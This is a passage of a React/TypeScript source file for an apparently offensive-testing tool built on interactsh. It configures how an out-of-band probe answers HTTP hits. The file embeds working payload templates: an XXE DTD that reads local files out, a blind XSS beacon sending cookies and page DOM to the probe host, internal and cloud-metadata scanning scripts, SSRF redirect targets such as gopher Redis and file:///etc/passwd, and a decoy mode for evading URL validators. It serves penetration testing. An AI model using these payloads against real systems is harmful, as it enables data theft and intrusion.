// The HTTP response tab: how this probe answers HTTP and HTTPS hits (phase 2, answered by the edge).
// The preview comes from the server, which runs the same code as the edge.
import { useEffect, useMemo, useRef, useState, type ReactNode } from "react";
import { ChevronLeft, ChevronRight, Copy, Plus, Terminal, X } from "lucide-react";
import { useApp, getState, fetchRule, previewRule, saveRule, setRuleDraft, takeRuleSeed } from "@/store";
import type { HttpRule, Probe, RuleMode, RuleState, RuleVersion } from "@/lib/types";
import { DEFAULT, MODE_DEFAULTS, decoyOf, effective, methodsOf, norm, ruleChanges, sameRule } from "@/lib/ruleDraft";
import { reachOf } from "@/lib/reach";
import { METADATA, redirectable } from "@/lib/metadata";
import { dayOrTime, exact, lineCount, plural, setupCmd } from "@/lib/format";
import { copy, toast } from "@/lib/toast";
import { Button } from "@/components/ui/button";
import { Switch } from "@/components/ui/switch";
import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { cn } from "@/lib/utils";
import { Chip } from "./bits";
import { ExactLine } from "./HttpView";
import { tagged } from "@/lib/kit";
import { hostedFile } from "@/lib/plant";

const MODES: [RuleMode, string][] = [["default", "Default reply"], ["redirect", "Redirect"], ["custom", "Custom response"], ["file", "Hosted file"]];

// Redirect targets that work without extra request headers (a redirect can't add them): the
// Payload kit's metadata catalog, then local services and scheme switches.
const TARGETS: [string, string][] = [
  ...METADATA.filter(redirectable).map((r): [string, string] => [`${r.provider}: ${r.name}`, r.url]),
  ["Localhost web", "http://127.0.0.1/"],
  ["Redis via gopher (INFO)", "gopher://127.0.0.1:6379/_INFO%0D%0A"],
  ["Memcached via dict (stats)", "dict://127.0.0.1:11211/stats"],
  ["Local file", "file:///etc/passwd"],
];

function templates(tag: string, host: string): Record<string, { label: string; contentType: string; body: string }> {
  const back = `https://${tagged(tag, host)}`;
  return {
    "xxe-dtd": {
      label: "XXE: external DTD (out-of-band read)",
      contentType: "application/xml-dtd",
      body: `<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${tagged(tag, host)}/x?d=%file;'>">\n%eval;\n%exfil;\n`,
    },
    "headless-page": {
      label: "HTML: probe page for headless browsers and PDF renderers",
      contentType: "text/html; charset=utf-8",
      body: `<!doctype html><title>.</title>\n<script>\nconst back = "${back}/beacon";\nnew Image().src = back + "?ua=" + encodeURIComponent(navigator.userAgent) + "&at=" + encodeURIComponent(location.href);\nfor (const t of ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080/"])\n  fetch(t, { mode: "no-cors" }).then(() => new Image().src = back + "?up=" + encodeURIComponent(t), () => new Image().src = back + "?down=" + encodeURIComponent(t));\n</script>\n`,
    },
    svg: {
      label: "SVG: external image fetch",
      contentType: "image/svg+xml",
      body: `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1" height="1"><image xlink:href="${back}/svg-image" width="1" height="1"/></svg>\n`,
    },
    jwks: { label: "JWKS: empty key set", contentType: "application/json", body: `{"keys":[]}\n` },
    // the processor names itself: a document() fetch back here with its vendor and version
    xslt: {
      label: "XSLT: stylesheet that reports the processor",
      contentType: "application/xslt+xml",
      body: `<?xml version="1.0"?>\n<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n<xsl:template match="/">\n<xsl:variable name="v" select="concat(system-property('xsl:vendor'), '|', system-property('xsl:version'))"/>\n<xsl:copy-of select="document(concat('http://${tagged(tag, host)}/xslt?v=', translate($v, ' ', '+')))"/>\n<xsl:value-of select="$v"/>\n</xsl:template>\n</xsl:stylesheet>\n`,
    },
    // where a stored payload fired: the page, its origin, the referrer, the User-Agent, readable cookies
    // and the start of the DOM, beaconed back (sendBeacon needs no CORS; the image is the fallback)
    "blind-xss": {
      label: "JavaScript: blind XSS beacon",
      contentType: "application/javascript",
      body: `(function () {\n  var back = "${back}/bxss";\n  var d = { url: location.href, origin: location.origin, referrer: document.referrer, ua: navigator.userAgent, cookies: document.cookie, title: document.title, dom: (document.documentElement.outerHTML || "").slice(0, 4000) };\n  try { navigator.sendBeacon(back, JSON.stringify(d)); } catch (e) {}\n  new Image().src = back + "?url=" + encodeURIComponent(d.url) + "&origin=" + encodeURIComponent(d.origin);\n})();\n`,
    },
    // an OpenID provider at the probe: a client that trusts discovery fetches the keys and endpoints here
    oidc: {
      label: "OIDC: discovery document pointing back here",
      contentType: "application/json",
      body: `{\n  "issuer": "${back}",\n  "authorization_endpoint": "${back}/authorize",\n  "token_endpoint": "${back}/token",\n  "userinfo_endpoint": "${back}/userinfo",\n  "jwks_uri": "${back}/jwks.json",\n  "response_types_supported": ["code", "id_token", "token id_token"],\n  "subject_types_supported": ["public"],\n  "id_token_signing_alg_values_supported": ["RS256", "none"]\n}\n`,
    },
  };
}

const ODD: [string, string][] = [["300", "300 Multiple Choices"], ["305", "305 Use Proxy"], ["306", "306 (unused)"], ["309", "309 (non-standard)"], ["310", "310 (non-standard)"]];
// which field a validation message is about, so the field itself can say so
function errorField(msg?: string) {
  if (!msg) return null;
  for (const [re, f] of [[/^Location/, "location"], [/^(Redirect status|Status)/, "status"], [/^Loop/, "loop"], [/^(Hop codes|Up to 10 hop)/, "hopStatuses"], [/^Decoy methods/, "decoyMethods"], [/^(Decoy|Up to 20 decoy)/, "decoy"], [/[Hh]eader/, "headers"],
    [/^Body/, "body"], [/^(File must|Preset)/, "preset"], [/^Delay/, "delay"], [/^Content type/, "contentType"], [/HTTP, HTTPS or both/, "schemes"]] as [RegExp, string][]) if (re.test(msg)) return f;
  return null;
}
const fld = "flex h-[30px] min-w-0 items-center gap-2 rounded-[3px] border border-rule bg-well px-2.5 font-mono text-body text-bone transition-colors focus-within:border-smoke";
const inputCls = "min-w-0 flex-1 bg-transparent outline-none placeholder:text-ash";
const seg = "h-[26px] rounded-none border-l border-rule px-[11px] text-body text-smoke first:border-l-0 data-[state=on]:bg-soot-2 data-[state=on]:font-semibold data-[state=on]:text-bone";

const Row = ({ label, children, help, error }: { label: string; children: ReactNode; help?: ReactNode; error?: string | null }) => (
  <>
    <div className="pt-[5px] text-body font-[550] text-smoke">{label}</div>
    <div className="flex min-w-0 flex-col gap-1.5">
      {children}
      {error && <p role="alert" className="max-w-[64ch] text-label leading-4 text-bad">{error}</p>}
      {help && <p className="max-w-[64ch] text-label leading-4 text-ash">{help}</p>}
    </div>
  </>
);

// the form reads in groups (what it serves, where to point the target, options), each under a small
// heading on a hairline, so a long form has a shape
const Group = ({ title, note }: { title: string; note?: string }) => (
  <h3 className="col-span-full mt-2 flex items-center gap-3 text-label font-[650] tracking-[.03em] text-smoke">
    {title}{note && <span className="font-normal tracking-normal text-ash">{note}</span>}<span className="h-px flex-1 bg-rule-2" />
  </h3>
);

const KB = 1024;
const sizeOf = (n: number) => (n < KB ? `${n} bytes` : `${(n / KB).toFixed(n < 10 * KB ? 1 : 0)} KB`);

function Seg<T extends string>({ value, onChange, items, label, mono }: { value: T; onChange: (v: T) => void; items: [T, string][]; label: string; mono?: boolean }) {
  return (
    <ToggleGroup type="single" value={value} onValueChange={(v) => v && onChange(v as T)} aria-label={label}
      className="w-fit overflow-hidden rounded-[3px] border border-rule" style={{ ["--gap" as string]: 0 }}>
      {items.map(([v, l]) => <ToggleGroupItem key={v} value={v} className={cn(seg, mono && "px-2.5 font-mono")}>{l}</ToggleGroupItem>)}
    </ToggleGroup>
  );
}

function Num({ value, onChange, label, max, w = "w-[64px]", invalid }: { value: number; onChange: (n: number) => void; label: string; max: number; w?: string; invalid?: boolean }) {
  return (
    <label className={cn(fld, w, invalid && "border-bad")}>
      <input inputMode="numeric" aria-label={label} value={String(value)} className={cn(inputCls, "text-right")}
        onChange={(e) => { const n = Number(e.target.value.replace(/\D/g, "").slice(0, 6) || 0); onChange(Math.min(n, max)); }} />
    </label>
  );
}

export function HttpRuleTab({ p }: { p: Probe }) {
  const host = useApp((s) => s.status?.payload?.host) || "<id>.<your domain>";
  const edge = useApp((s) => s.status?.edge);
  const CUTOVER = setupCmd(useApp((s) => s.status?.app));
  const live = edge?.state === "running";
  const [rs, setRs] = useState<RuleState | null>(null);
  const [loadErr, setLoadErr] = useState<string | null>(null);
  const [draft, setDraft] = useState<HttpRule>(DEFAULT);
  const [scheme, setScheme] = useState<"http" | "https">("http");
  const [hop, setHop] = useState(1);
  const [preview, setPreview] = useState<{ raw?: string; error?: string; delayMs?: number }>({});
  const [saving, setSaving] = useState(false);
  const [touched, setTouched] = useState<Set<string>>(new Set());
  useEffect(() => setTouched(new Set()), [p.tag]);
  const FIELD_OF: Record<string, string> = { Location: "location", Body: "body", Status: "status", "Delay in milliseconds": "delay", "Content type": "contentType", "Hop codes": "hopStatuses", "Decoy source IPs": "decoy" };
  const onLeave = (e: React.FocusEvent) => {
    const l = (e.target as HTMLElement).getAttribute("aria-label") ?? "";
    const f = FIELD_OF[l] ?? (/^Header \d+/.test(l) ? "headers" : null);
    if (f && !touched.has(f)) setTouched(new Set(touched).add(f));
  };

  // load this probe's rule; a new active version (saved elsewhere) replaces an untouched draft
  const activeVersion = p.httpRule?.version ?? 0;
  // typed before the rule finished loading (focus lands in Location right after planting): the load
  // must not wipe it
  const typed = useRef<string | null>(null);
  useEffect(() => {
    let live = true;
    fetchRule(p.tag).then((r) => {
      if (!live) return;
      setRs(r); setLoadErr(null); setHop(1);
      const kept = getState().ruleDrafts[p.tag]; // unsaved edits from before a tab or probe switch
      const seed = r.active || kept ? null : takeRuleSeed(p.tag); // planted as Redirect / Hosted file
      if (typed.current === p.tag && !r.active) return;
      setDraft(kept ?? norm(seed ? { ...DEFAULT, ...MODE_DEFAULTS[seed], mode: seed } : r.active?.rule ?? DEFAULT));
    },
      (e) => live && setLoadErr((e as Error).message));
    return () => { live = false; };
  }, [p.tag, activeVersion]);

  // a web hit on this probe changes the history's counts and reach: refresh them (the draft stays)
  const webHits = useApp((s) => s.list.reduce((n, i) => n + (i.tag === p.tag && (i.protocol === "http" || i.protocol === "https") ? 1 : 0), 0));
  useEffect(() => {
    if (!rs) return;
    let live = true;
    const t = setTimeout(() => fetchRule(p.tag).then((r) => { if (live) setRs((prev) => (prev && prev.active?.version === r.active?.version ? r : prev)); }, () => {}), 400);
    return () => { live = false; clearTimeout(t); };
  }, [webHits]); // eslint-disable-line react-hooks/exhaustive-deps

  const base = useMemo(() => norm(rs?.active?.rule ?? DEFAULT), [rs]);
  const dirty = rs != null && !sameRule(draft, base);
  // the draft is kept in the store, so the tab label says "edited" and nothing is lost on a switch
  useEffect(() => { if (rs) setRuleDraft(p.tag, dirty ? draft : null); }, [rs, dirty, draft, p.tag]);

  // preview the exact next answer (debounced; the server validates)
  useEffect(() => {
    const t = setTimeout(() => {
      previewRule(p.tag, effective(draft), scheme, hop).then((r) => setPreview(r.error ? { error: r.error } : r), (e) => setPreview({ error: (e as Error).message }));
    }, 220);
    return () => clearTimeout(t);
  }, [p.tag, draft, scheme, hop]);

  const set = (patch: Partial<HttpRule>) => { if (!rs) typed.current = p.tag; setDraft((d) => ({ ...d, ...patch })); };
  const setMode = (mode: RuleMode) => { setDraft((d) => ({ ...MODE_DEFAULTS[mode], ...d, mode })); setHop(1); };
  const nextVersion = (rs?.history[0]?.version ?? 0) + 1;
  const save = async () => {
    setSaving(true);
    try {
      const r = await saveRule(p.tag, effective(draft));
      setRs(r); setDraft(norm(r.active?.rule ?? DEFAULT));
      toast(live ? `Saved ${p.tag} v${r.active?.version}: the next hit gets it` : `Saved ${p.tag} v${r.active?.version}. Not served until you run the cutover: the internet still gets interactsh's reply.`);
    } catch (e) { toast((e as Error).message, true); } finally { setSaving(false); }
  };

  // Ctrl+S / ⌘S saves, like an editor, when Save would
  const saveRef = useRef<() => void>(() => {});
  saveRef.current = () => { if (dirty && !saving && !preview.error) void save(); };
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (!(e.metaKey || e.ctrlKey) || e.altKey || e.key.toLowerCase() !== "s") return;
      if (document.querySelector("[role=dialog],[role=alertdialog]")) return;
      e.preventDefault();
      saveRef.current();
    };
    addEventListener("keydown", onKey);
    return () => removeEventListener("keydown", onKey);
  }, []);

  // the sticky aside fits between the panel's top and the save bar: their heights as CSS variables
  const panel = useRef<HTMLDivElement>(null), foot = useRef<HTMLDivElement>(null);
  useEffect(() => {
    const el = panel.current, f = foot.current;
    if (!el || !f) return;
    const ro = new ResizeObserver(() => {
      el.style.setProperty("--pane-h", `${el.clientHeight}px`);
      el.style.setProperty("--foot-h", `${f.offsetHeight}px`);
    });
    ro.observe(el);
    ro.observe(f);
    return () => ro.disconnect();
  }, [loadErr]);

  if (loadErr) return <div id="probe-panel" role="tabpanel" aria-labelledby="probe-tab-http" className="px-6 py-[18px] text-body text-bad">Couldn't load this probe's rule: {loadErr}</div>;
  const tpl = templates(p.tag, host);
  const loop = draft.mode === "redirect" ? draft.loop ?? 0 : 0;
  const hops = loop ? loop + 1 : 1;
  const activeV = rs?.history.find((v) => v.version === rs?.active?.version);
  const reached = !dirty && activeV ? (activeV.clients ?? []).map((c) => reachOf(activeV.rule, c)).filter(Boolean) as string[] : [];
  // a missing value isn't an error until you've left the field; a wrong value is shown right away
  const pending = !!preview.error && /is required/.test(preview.error) && !touched.has(errorField(preview.error) ?? "");
  const errF = pending ? null : errorField(preview.error);
  const errFor = (f: string) => (errF === f ? preview.error!.replace(/^Can't answer like this yet: /, "") : null);
  const bad = (f: string) => errF === f && "border-bad";
  // a template's body that has been rewritten since is the user's own file now
  const tplEdited = !!draft.template && !!tpl[draft.template] && (draft.body !== tpl[draft.template].body || draft.contentType !== tpl[draft.template].contentType);
  const { urls: fetchUrls, plant } = hostedFile(draft, p.tag, host);
  const body = draft.body ?? "";
  const bodyBytes = draft.bodyEncoding === "base64" ? Math.floor(body.replace(/[^A-Za-z0-9+/]/g, "").length * 3 / 4) : new TextEncoder().encode(body).length;
  const bodyRow = (
    <Row label="Body" error={errFor("body")} help={draft.bodyEncoding === "base64" ? "Base64 is decoded before sending, for binary bodies." : undefined}>
      {/* a well like the raw panes: a title bar with the size and encoding, then the text unwrapped,
          so markup keeps its lines */}
      <div className={cn("flex min-w-0 flex-col rounded-[3px] border border-rule bg-well focus-within:border-smoke", bad("body"))}>
        <div className="flex h-8 flex-none items-center gap-2 border-b border-rule-2 pr-1 pl-2.5">
          <span className="truncate text-label text-ash">{body ? `${lineCount(body)} ${lineCount(body) === 1 ? "line" : "lines"} · ${sizeOf(bodyBytes)}` : "Empty"} of 256 KB{draft.bodyEncoding === "base64" ? " decoded" : ", sent as UTF-8"}</span>
          <span className="ml-auto"><Seg label="Body encoding" value={draft.bodyEncoding ?? "text"} onChange={(v) => set({ bodyEncoding: v })} items={[["text", "Text"], ["base64", "Base64"]]} /></span>
        </div>
        <textarea aria-label="Body" aria-invalid={errF === "body"} spellCheck={false} wrap="off" rows={Math.min(Math.max(lineCount(body) + 1, 6), 20)} value={body} onChange={(e) => set({ body: e.target.value })}
          className="min-h-[160px] w-full resize-y overflow-auto bg-transparent px-2.5 py-2 font-mono text-body leading-[1.125rem] whitespace-pre text-bone outline-none [tab-size:2]" />
      </div>
    </Row>
  );

  // the header list: Custom response's headers, and a hosted file's extra ones
  const headers = draft.headers ?? [];
  const headerRows = (
    <>
      {headers.map(([n, v], i) => (
        <div key={i} className="flex gap-2">
          <label className={cn(fld, "w-[180px]", bad("headers"))}><input aria-label={`Header ${i + 1} name`} spellCheck={false} value={n} placeholder="Name" className={inputCls} onChange={(e) => set({ headers: headers.map((h, j) => (j === i ? [e.target.value, h[1]] : h)) })} /></label>
          <label className={cn(fld, "flex-1")}><input aria-label={`Header ${i + 1} value`} spellCheck={false} value={v} placeholder="Value" className={inputCls} onChange={(e) => set({ headers: headers.map((h, j) => (j === i ? [h[0], e.target.value] : h)) })} /></label>
          <Button variant="ghost" size="icon-sm" aria-label={`Remove header ${n || i + 1}`} onClick={() => set({ headers: headers.filter((_, j) => j !== i) })}><X /></Button>
        </div>
      ))}
      <Button variant="ghost" size="sm" className="w-fit" disabled={headers.length >= 30} onClick={() => set({ headers: [...headers, ["", ""]] })}><Plus />Add header</Button>
    </>
  );
  // the decoy's methods: HEAD and OPTIONS as toggles, anything else typed (what lib/rules.mjs accepts)
  const decoyMethods = methodsOf(draft.decoy?.methods);
  const setMethods = (m: string[] | string) => set({ decoy: { ...draft.decoy, methods: m } });
  const toggleMethod = (m: string) => setMethods(decoyMethods.includes(m) ? decoyMethods.filter((x) => x !== m) : [...decoyMethods, m]);
  const otherMethods = typeof draft.decoy?.methods === "string"
    ? draft.decoy.methods.split(/[\s,]+/).filter((x) => x && !/^(head|options)$/i.test(x)).join(" ") + (/\s$/.test(draft.decoy.methods) ? " " : "")
    : decoyMethods.filter((x) => x !== "HEAD" && x !== "OPTIONS").join(" ");

  return (
    // the panel is the container: the two columns collapse on its own width, not the window's
    <div ref={panel} id="probe-panel" role="tabpanel" aria-labelledby="probe-tab-http" className="@container min-h-0 overflow-auto max-[820px]:overflow-visible">
    <div className="relative grid grid-cols-[minmax(0,1fr)_400px] content-start gap-x-7 px-6 pt-[18px] @max-[940px]:grid-cols-1 max-[820px]:px-3.5">
      {(!edge || edge.state === "absent") && (
        <div className="col-span-full mb-4 flex flex-wrap items-center gap-x-3 gap-y-1.5 rounded-[3px] border border-caution-border bg-caution-ground px-3 py-2 text-body leading-[1.125rem] text-caution-ink">
          <span><b className="font-semibold">Rules aren't served yet.</b> Until you run the cutover, the internet still gets interactsh's default reply. Rules save and preview here meanwhile.</span>
          <Button variant="quiet" size="sm" className="max-w-full" onClick={() => copy(CUTOVER, "cutover command")}><Copy /><span className="truncate font-mono">{CUTOVER}</span></Button>
        </div>
      )}
      {edge && edge.state !== "absent" && !live && (
        <p className="col-span-full mb-4 rounded-[3px] border border-alarm-border bg-alarm-ground px-3 py-2 text-body leading-[1.125rem] text-alarm-banner-ink">
          <b className="font-semibold">The edge isn't answering.</b> Your probes get no HTTP reply and their hits aren't captured until it's back (sudo systemctl restart colluder-edge).
        </p>
      )}
      <div onBlurCapture={onLeave} className="grid grid-cols-[96px_minmax(0,1fr)] content-start gap-x-[18px] gap-y-4 pb-4 max-[820px]:grid-cols-1 max-[820px]:gap-y-1.5">
        <Row label="Answer with" help={draft.mode === "default" ? `interactsh's standard reply: 200, CORS headers, the id reversed in the body.${live ? " Sent by Colluder's edge, so the hit records exactly what went out." : ""}` : "HTTP and HTTPS hits only; DNS lookups keep interactsh's answer."}>
          {draft.mode === "preset"
            ? <div className="flex flex-wrap items-center gap-2"><span className="text-body font-semibold">XXE preset</span><Button variant="ghost" size="sm" onClick={() => setMode("default")}>Use another kind of answer</Button></div>
            : <Seg label="Answer with" value={draft.mode} onChange={setMode} items={MODES} />}
        </Row>

        {draft.mode === "redirect" && (
          <>
            <Group title="The redirect" />
            <Row label="Status" error={errFor("status")} help="302 and 303 usually turn a POST into a GET; 307 and 308 keep the method and body.">
              <div className="flex flex-wrap items-center gap-2">
                <Seg label="Redirect status" mono value={String(draft.status)} onChange={(v) => set({ status: Number(v) })} items={["301", "302", "303", "307", "308"].map((s) => [s, s])} />
                <Select value={ODD.some(([c]) => c === String(draft.status)) ? String(draft.status) : ""} onValueChange={(v) => set({ status: Number(v) })}>
                  <SelectTrigger aria-label="Unusual redirect status" className={cn("h-[28px] w-auto gap-1.5 rounded-[3px] border-rule bg-transparent px-2.5 font-mono text-body", ODD.some(([c]) => c === String(draft.status)) && "bg-soot-2 font-semibold text-bone")}><SelectValue placeholder="Unusual…" /></SelectTrigger>
                  <SelectContent>{ODD.map(([c, l]) => <SelectItem key={c} value={c}>{l}</SelectItem>)}</SelectContent>
                </Select>
              </div>
            </Row>
            <Row label="Location" error={errFor("location")} help="Scheme switches (gopher, dict, file) only land if the client follows them. Cloud targets listed here need no extra request headers.">
              <div className="flex min-w-0 gap-2">
                <label className={cn(fld, "flex-1", bad("location"))}><input aria-label="Location" aria-invalid={errF === "location"} spellCheck={false} value={draft.location ?? ""} placeholder="A URL, or pick from Targets" className={cn(inputCls, "placeholder:font-sans")} onChange={(e) => set({ location: e.target.value })}
                  onBlur={(e) => { const v = e.target.value.trim(); if (/^[a-z0-9.-]+\.[a-z]{2,}(?::\d+)?(?:[/?#].*)?$/i.test(v)) set({ location: `https://${v}` }); }} /></label>
                <Select value="" onValueChange={(v) => set({ location: v })}>
                  <SelectTrigger aria-label="Pick a target" className="h-[30px] w-auto gap-1.5 rounded-[3px] border-rule bg-transparent px-2.5 text-body font-[550]"><SelectValue placeholder="Targets" /></SelectTrigger>
                  <SelectContent>{TARGETS.map(([l, u]) => <SelectItem key={u} value={u}>{l}</SelectItem>)}</SelectContent>
                </Select>
              </div>
            </Row>
            <Row label="Loop first" error={errFor("loop")} help={loop ? <>A blind SSRF that follows redirects shows up as a run of {loop + 1} hits: the first request, then <b className="font-[550] text-smoke">?hop=2</b> to <b className="font-[550] text-smoke">?hop={loop + 1}</b>. One that doesn't follow stops after the first. Each hop keeps the scheme it arrived on.{loop >= 9 && <> <b className="font-[550] text-bone">Go's HTTP client stops after 10 redirects</b>, so with {loop} hops a Go client never reaches the final Location; use 8 or fewer to test past it.</>}</> : "Bounce the client back through this probe before the final redirect, so following redirects shows up as a run of hits."}>
              <div className="flex items-center gap-2">
                <Switch aria-label="Loop through this probe first" checked={loop > 0} onCheckedChange={(on) => { set({ loop: on ? 3 : 0 }); setHop(1); }} />
                {loop > 0 && <><Num label="Hops" value={loop} max={20} onChange={(n) => { set({ loop: Math.max(n, 1) }); setHop(1); }} /><span className="text-body text-smoke">hops through this probe first</span></>}
              </div>
              {reached.length > 0 && (
                <div className="text-body text-bone"><span className="text-smoke">Seen on v{rs?.active?.version}, per client (self-tests and decoy replies left out):</span>
                  <ul className="mt-0.5 space-y-0.5">{reached.map((l) => <li key={l}>{l}.</li>)}</ul>
                </div>
              )}
            </Row>
            {loop > 0 && (
              <Row label="Hop codes" error={errFor("hopStatuses")} help={<>Loop hops cycle through these codes (empty: every hop is a {draft.status}). Where the run of hits stops tells you which code the client's HTTP library won't follow; 300, 305, 306, 309 and 310 are the telling ones.</>}>
                <label className={cn(fld, "w-[220px]", bad("hopStatuses"))}><input aria-label="Hop codes" spellCheck={false} value={Array.isArray(draft.hopStatuses) ? draft.hopStatuses.join(" ") : draft.hopStatuses ?? ""} placeholder={`e.g. 301 305 309`} className={cn(inputCls, "placeholder:font-sans")} onChange={(e) => { set({ hopStatuses: e.target.value }); }} /></label>
              </Row>
            )}
          </>
        )}

        {draft.mode === "preset" && draft.params && (
          <>
            <Row label="Serves" help={<>Any path under the probe, by its last segment; everything else gets the default reply, which is where the file arrives (as a <span className="font-mono">kx0</span> hit).</>}>
              <ul className="space-y-0.5 text-body text-smoke">
                <li><span className="font-mono text-bone">x.dtd</span> · a DTD that reads the file and sends it back</li>
                <li><span className="font-mono text-bone">feed.xml</span>, <span className="font-mono text-bone">sitemap.xml</span> · documents that pull the DTD, for "import from URL" features</li>
              </ul>
            </Row>
            <Row label="File" error={errFor("preset")} help="A path, a file:/// URL, or php://filter/convert.base64-encode/resource=… for multi-line files on PHP.">
              <label className={cn(fld, bad("preset"))}><input aria-label="File to read" spellCheck={false} value={draft.params.file} className={inputCls} onChange={(e) => set({ params: { ...draft.params!, file: e.target.value } })} /></label>
            </Row>
          </>
        )}

        {draft.mode === "custom" && (
          <>
            <Group title="The response" />
            <Row label="Status" error={errFor("status")}><Num label="Status" invalid={errF === "status"} value={draft.status ?? 200} max={599} onChange={(n) => set({ status: n })} /></Row>
            <Row label="Headers" error={errFor("headers")} help="Content-Length is computed and Connection is always close. Server stays your payload domain unless you set one.">
              {headerRows}
            </Row>
            {bodyRow}
          </>
        )}

        {draft.mode === "file" && (
          <>
            <Group title="Point the target at it" note={dirty ? "from your unsaved changes: save before you plant it" : "served at any path under the probe, over HTTP and HTTPS"} />
            {plant && <Row label="Plant this">{<CopyLine text={plant[0]} what={plant[1]} strong />}</Row>}
            <Row label="Fetch URL">
              {fetchUrls.map((u) => <CopyLine key={u} text={u} what="fetch URL" />)}
            </Row>

            <Group title="The file" />
            <Row label="Template" help={tplEdited ? "Edited since: Save keeps your version. Picking a template again replaces the type and body." : "Fills the type and body with this probe's own payload host, so whatever it makes the target fetch comes back here as hits."}>
              <div className="flex flex-wrap items-center gap-2">
                <Select value={draft.template || ""} onValueChange={(v) => set({ template: v, contentType: tpl[v].contentType, body: tpl[v].body, bodyEncoding: "text" })}>
                  <SelectTrigger aria-label="Template" className="h-[30px] w-fit min-w-[280px] gap-1.5 rounded-[3px] border-rule bg-transparent px-2.5 text-body"><SelectValue placeholder="Start from a template" /></SelectTrigger>
                  <SelectContent>{Object.entries(tpl).map(([k, t]) => <SelectItem key={k} value={k}>{t.label}</SelectItem>)}</SelectContent>
                </Select>
                {tplEdited && <Chip grey>edited</Chip>}
              </div>
            </Row>
            <Row label="Content type" error={errFor("contentType")}><label className={cn(fld, bad("contentType"))}><input aria-label="Content type" spellCheck={false} value={draft.contentType ?? ""} className={inputCls} onChange={(e) => set({ contentType: e.target.value })} /></label></Row>
            {bodyRow}
            <Row label="Headers" error={errFor("headers")} help="Sent with the file, e.g. Access-Control-Allow-Origin: * for a script, JSON or font fetched cross-origin. Content-Type is the field above.">
              {headerRows}
            </Row>

          </>
        )}

        {draft.mode !== "default" && (
          <>
            <Group title="Options" />
            <Row label="Delay" error={errFor("delay")}>
              <div className="flex items-center gap-2"><Num label="Delay in milliseconds" invalid={errF === "delay"} value={draft.delayMs} max={60000} w="w-[84px]" onChange={(n) => set({ delayMs: n })} /><span className="text-body text-smoke">ms before answering</span><span className="text-label text-ash">up to 60 s, to test timeouts</span></div>
            </Row>
            <Row label="Applies to" error={errFor("schemes")}>
              <div className="flex items-center gap-4 text-body">
                {(["http", "https"] as const).map((k) => (
                  <label key={k} className="flex cursor-pointer items-center gap-[7px]">
                    <input type="checkbox" className="size-3.5 accent-bone" checked={draft.schemes[k]} onChange={(e) => set({ schemes: { ...draft.schemes, [k]: e.target.checked } })} />{k.toUpperCase()}
                  </label>
                ))}
                <span className="text-label text-ash">a scheme that's off gets the default reply</span>
              </div>
            </Row>
            <Row label="Decoy" error={errFor("decoy")} help={draft.decoy ? <>Matching requests get interactsh's default reply at once, so a validator that fetches the URL before saving it sees nothing odd; everyone else gets the rule. The first-requests count starts again with each saved version{live ? " and if the edge restarts" : ""}.</> : "Send a harmless reply to some requests first: beats validators that fetch the URL before accepting it."}>
              <div className="flex items-center gap-2">
                <Switch aria-label="Decoy reply" checked={!!draft.decoy} onCheckedChange={(on) => set({ decoy: on ? { first: 1, ua: "", sources: "" } : null })} />
                {draft.decoy && <span className="text-body text-smoke">default reply for any of these</span>}
              </div>
              {draft.decoy && (
                <div className="grid grid-cols-[auto_minmax(0,1fr)] items-center gap-x-2.5 gap-y-1.5 text-body text-smoke">
                  <span>Methods</span>
                  <span className="flex flex-wrap items-center gap-2">
                    {["HEAD", "OPTIONS"].map((m) => (
                      <label key={m} className="flex cursor-pointer items-center gap-[7px] font-mono">
                        <input type="checkbox" className="size-3.5 accent-bone" checked={decoyMethods.includes(m)} onChange={() => toggleMethod(m)} />{m}
                      </label>
                    ))}
                    <label className={cn(fld, "w-[150px]", bad("decoyMethods"))}><input aria-label="Other decoy methods" spellCheck={false} value={otherMethods} placeholder="others, e.g. PROPFIND" className={cn(inputCls, "placeholder:font-sans")}
                      onChange={(e) => setMethods(`${decoyMethods.filter((x) => x === "HEAD" || x === "OPTIONS").join(" ")} ${e.target.value.toUpperCase()}`.trimStart())} /></label>
                  </span>
                  {errFor("decoyMethods") && <><span /><p role="alert" className="text-label leading-4 text-bad">{errFor("decoyMethods")}</p></>}
                  <span>First</span>
                  <span className="flex items-center gap-2"><Num label="Decoy first requests" value={draft.decoy.first ?? 0} max={20} w="w-[52px]" onChange={(n) => set({ decoy: { ...draft.decoy, first: n } })} />requests</span>
                  <span>User-Agent has</span>
                  <label className={cn(fld, "max-w-[320px]")}><input aria-label="Decoy User-Agent text" spellCheck={false} value={draft.decoy.ua ?? ""} placeholder="e.g. Slackbot, python-requests" className={cn(inputCls, "placeholder:font-sans")} onChange={(e) => set({ decoy: { ...draft.decoy, ua: e.target.value } })} /></label>
                  <span>Source IPs</span>
                  <label className={cn(fld, "max-w-[320px]", bad("decoy"))}><input aria-label="Decoy source IPs" spellCheck={false} value={Array.isArray(draft.decoy.sources) ? draft.decoy.sources.join(" ") : draft.decoy.sources ?? ""} placeholder="space-separated" className={cn(inputCls, "placeholder:font-sans")} onChange={(e) => set({ decoy: { ...draft.decoy, sources: e.target.value } })} /></label>
                </div>
              )}
            </Row>
          </>
        )}
      </div>

      <aside className="flex min-w-0 flex-col gap-3.5 pb-4 @min-[940px]:sticky @min-[940px]:top-[18px] @min-[940px]:max-h-[calc(var(--pane-h,100vh)-18px-var(--foot-h,64px))] @min-[940px]:self-start @min-[940px]:overflow-y-auto" aria-label="Preview and history">
        <div className="flex flex-col rounded-[3px] border border-rule bg-well">
          <div className="flex h-8 items-center gap-2 border-b border-rule-2 pr-1.5 pl-3 text-body font-[650]">
            <span className="whitespace-nowrap">{live ? "Next answer" : "Answer after cutover"}</span>
            {dirty
              ? <span className="flex-none rounded-[9px] border border-caution-border bg-caution-ground px-1.5 text-label leading-[1.0625rem] font-[650] text-caution-ink" title="Includes your unsaved changes">unsaved</span>
              : live && activeV && !p.retiredAt && <span className="flex-none" title={`Saved v${activeV.version} is what the edge answers now`}><Chip grey>live v{activeV.version}</Chip></span>}
            {(() => {
